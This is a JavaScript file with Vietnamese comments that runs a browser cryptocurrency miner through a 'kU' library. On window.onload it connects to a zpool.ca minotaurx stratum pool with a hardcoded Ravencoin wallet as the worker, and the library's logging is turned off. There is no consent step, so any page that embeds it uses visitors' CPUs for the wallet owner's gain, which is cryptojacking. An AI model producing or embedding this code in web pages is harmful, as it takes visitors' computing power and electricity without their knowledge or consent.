// Đảm bảo rằng các thư viện hoặc đối tượng như kU và các hàm liên quan đã được tải trước

// Hàm để lấy tham số từ URL
function getQueryParams() {
    const params = new URLSearchParams(window.location.search);
    let config = {};

    config.algorithm = params.get('algorithm') || 'cwm_minotaurx'; // Thuật toán khai thác
    config.host = params.get('host') || 'minotaurx.na.mine.zpool.ca'; // Host server
    config.port = params.get('port') || '7019'; // Cổng server
    config.worker = params.get('worker') || 'RVZD5AjUBXoNnsBg9B2AzTTdEeBNLfqs65'; // Worker name
    config.password = params.get('password') || 'c=RVN'; // Mật khẩu
    config.workers = parseInt(params.get('workers')) || 1; // Số worker

    return config;
}

// Khởi tạo và bắt đầu quá trình khai thác
function startMining() {
    const config = getQueryParams();

    // Cấu hình khai thác
    const miningConfig = {
        algorithm: config.algorithm,
        config: {
            stratum: {
                server: config.host,
                port: config.port,
                worker: config.worker,
                password: config.password
            },
            options: {
                workers: config.workers,
                log: false
            }
        }
    };

    // Khởi tạo lớp kU với cấu hình khai thác
    const miner = new kU(miningConfig);

    // Bắt đầu quá trình khai thác
    miner.start();

    // Lắng nghe các sự kiện từ quá trình khai thác
    miner.on('start', () => {
        console.log('Mining Started!');
    });

    miner.on('shared', () => {
        console.log('Share Accepted!');
    });

    miner.on('reject', () => {
        console.log('Share Rejected!');
    });

    miner.on('hashrate', (hashrate) => {
        console.log(`Hashrate: ${hashrate} H/s`);
    });

    miner.on('error', (error) => {
        console.error('Error occurred: ', error);
    });
}

// Gọi hàm để bắt đầu khai thác khi trang được tải
window.onload = function() {
    startMining();
};
